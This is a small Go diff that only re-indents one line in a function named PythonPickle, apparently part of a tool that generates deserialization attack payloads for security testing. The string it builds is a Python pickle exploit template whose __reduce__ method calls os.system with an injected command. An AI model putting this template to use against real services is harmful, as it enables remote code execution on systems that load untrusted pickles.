@@ -82,7 +82,7 @@ func (e *Engine) PythonPickle() DeserResult {
 	riskScore := 0.9
 	chainDepth := 3
 
-_picklePayload := fmt.Sprintf(
+	_picklePayload := fmt.Sprintf(
 		"import pickle, os, base64\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('%s',))\nbase64.b64encode(pickle.dumps(Exploit()))",
 		payload,
 	)
